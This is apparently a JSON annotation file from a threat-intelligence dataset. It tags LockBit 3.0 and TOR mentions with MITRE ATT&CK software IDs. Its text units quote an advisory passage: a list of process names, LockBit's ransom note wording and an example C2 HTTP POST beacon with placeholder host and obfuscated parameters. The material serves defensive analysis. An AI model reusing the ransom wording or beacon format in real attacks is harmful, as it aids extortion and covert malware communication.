@@ -1,0 +1,190 @@
+{
+  "mentions": [
+    {
+      "id": "m001",
+      "text": "LockBit 3.0",
+      "codes": [
+        "S"
+      ]
+    },
+    {
+      "id": "m002",
+      "text": "TOR",
+      "codes": [
+        "S"
+      ]
+    },
+    {
+      "id": "m003",
+      "text": "Lockbit 3.0",
+      "codes": [
+        "S"
+      ]
+    }
+  ],
+  "choices": {
+    "m001_S": {
+      "name": "LockBit 3.0",
+      "type": "Software",
+      "attack_id": null
+    },
+    "m002_S": {
+      "name": "TOR",
+      "type": "Software",
+      "attack_id": null
+    },
+    "m003_S": {
+      "name": "Lockbit 3.0",
+      "type": "Software",
+      "attack_id": null
+    }
+  },
+  "units": {
+    "u001": {
+      "start": 0,
+      "end": 3,
+      "text": "bat",
+      "line_start": 0
+    },
+    "u002": {
+      "start": 4,
+      "end": 15,
+      "text": "thunderbird",
+      "line_start": 4
+    },
+    "u003": {
+      "start": 16,
+      "end": 21,
+      "text": "visio",
+      "line_start": 16
+    },
+    "u004": {
+      "start": 22,
+      "end": 29,
+      "text": "winword",
+      "line_start": 22
+    },
+    "u005": {
+      "start": 30,
+      "end": 37,
+      "text": "wordpad",
+      "line_start": 30
+    },
+    "u006": {
+      "start": 38,
+      "end": 45,
+      "text": "notepad",
+      "line_start": 38
+    },
+    "u007": {
+      "start": 46,
+      "end": 69,
+      "text": "LockBit 3.0 Ransom Note",
+      "line_start": 46
+    },
+    "u008": {
+      "start": 70,
+      "end": 145,
+      "text": "~~~ LockBit 3.0 the world's fastest and most stable ransomware from 2019~~~",
+      "line_start": 70
+    },
+    "u009": {
+      "start": 146,
+      "end": 186,
+      "text": ">>>>> Your data is stolen and encrypted.",
+      "line_start": 146
+    },
+    "u010": {
+      "start": 187,
+      "end": 268,
+      "text": "If you don't pay the ransom, the data will be published on our TOR darknet sites.",
+      "line_start": 187
+    },
+    "u011": {
+      "start": 269,
+      "end": 416,
+      "text": "Keep in mind that once your data appears on our leak site, it could be bought by your competitors at any second, so don't hesitate for a long time.",
+      "line_start": 187
+    },
+    "u012": {
+      "start": 417,
+      "end": 485,
+      "text": "The sooner you pay the ransom, the sooner your company will be safe.",
+      "line_start": 187
+    },
+    "u013": {
+      "start": 486,
+      "end": 505,
+      "text": "Network Connections",
+      "line_start": 486
+    },
+    "u014": {
+      "start": 506,
+      "end": 590,
+      "text": "If configured, Lockbit 3.0 will send two HTTP POST requests to one of the C2servers.",
+      "line_start": 506
+    },
+    "u015": {
+      "start": 591,
+      "end": 716,
+      "text": "Information about the victim host and bot are encrypted with an Advanced Encryption Standard (AES) key and encoded in Base64.",
+      "line_start": 506
+    },
+    "u016": {
+      "start": 717,
+      "end": 745,
+      "text": "Example of HTTP POST request",
+      "line_start": 717
+    },
+    "u017": {
+      "start": 746,
+      "end": 846,
+      "text": "POST <Lockbit C2>/?7F6Da=u5a0TdP0&Aojq=&NtN1W=OuoaovMvrVJSmPNaA5&fckp9=FCYyT6b7kdyeEXywS8I8 HTTP/1.1",
+      "line_start": 746
+    },
+    "u018": {
+      "start": 847,
+      "end": 858,
+      "text": "Accept: */*",
+      "line_start": 847
+    },
+    "u019": {
+      "start": 859,
+      "end": 918,
+      "text": "Accept-Encoding: gzip, deflate, br Content-Type: text/plain",
+      "line_start": 859
+    },
+    "u020": {
+      "start": 919,
+      "end": 972,
+      "text": "User-Agent: Safari/537.36 <Lockbit User Agent String>",
+      "line_start": 919
+    },
+    "u021": {
+      "start": 973,
+      "end": 991,
+      "text": "Host: <Lockbit C2>",
+      "line_start": 973
+    },
+    "u022": {
+      "start": 992,
+      "end": 1044,
+      "text": "Connection: Keep-Alive LIWy=RJ51lB5GM&a4OuN=<Lockbit",
+      "line_start": 992
+    },
+    "u023": {
+      "start": 1045,
+      "end": 1341,
+      "text": "ID>&LoSyE3=8SZ1hdlhzld4&DHnd99T=rTx9xGlInO6X0zWW&2D6=Bokz&T1guL=MtRZsFCRMKyBmfmqI& 6SF3g=JPDt9lfJIQ&wQadZP=<Base64 encrypted data> Xni=AboZOXwUw&2rQnM4=94L&0b=ZfKv7c&NO1d=M2kJlyus&AgbDTb=xwSpba&8sr=EndL4n0HVZjxPR& m4ZhTTH=sBVnPY&xZDiygN=cU1pAwKEztU&=5q55aFIAfTVQWTEm&4sXwVWcyhy=l68FrIdBESIvfCkvYl",
+      "line_start": 1045
+    }
+  },
+  "captions": {},
+  "identities": {
+    "m001_S": "attack:S1202",
+    "m002_S": "attack:S0183",
+    "m003_S": "attack:S1202"
+  },
+  "unavailable_choices": [],
+  "evidence_patterns": []
+}
